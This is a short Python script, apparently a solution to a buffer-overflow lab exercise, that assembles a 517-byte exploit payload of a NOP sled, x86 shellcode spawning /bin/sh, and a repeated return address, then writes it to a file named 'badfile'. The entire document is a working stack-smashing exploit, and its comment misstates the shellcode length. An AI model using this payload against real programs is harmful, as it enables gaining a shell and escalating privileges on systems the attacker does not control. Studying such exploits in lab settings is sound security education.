#!/usr/bin/env python3
import struct

# Shellcode to spawn /bin/sh (25 bytes)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\x31\xd2\x31\xc0\xb0"
    b"\x0b\xcd\x80"
)

# Create the initial part of the payload
NOP_SLED_SIZE = 46
payload = b"\x90" * NOP_SLED_SIZE  # NOP sled

# Add shellcode
payload += shellcode

# Return address (adjust as needed based on your environment)
ret_addr = b"\xcc\xc8\xff\xff"

# Repeat the return address multiple times
REPEAT_COUNT = 112
payload += ret_addr * REPEAT_COUNT

# Ensure the payload is exactly 517 bytes
if len(payload) < 517:
    payload += b"C" * (517 - len(payload))
elif len(payload) > 517:
    payload = payload[:517]

# Write the payload to 'badfile'
with open("badfile", "wb") as f:
    f.write(payload)

print(f"Payload size: {len(payload)} bytes")
print(f"NOP sled size: {NOP_SLED_SIZE} bytes")
print(f"Return address repeated {REPEAT_COUNT} times")
print("Exploit written to 'badfile'")
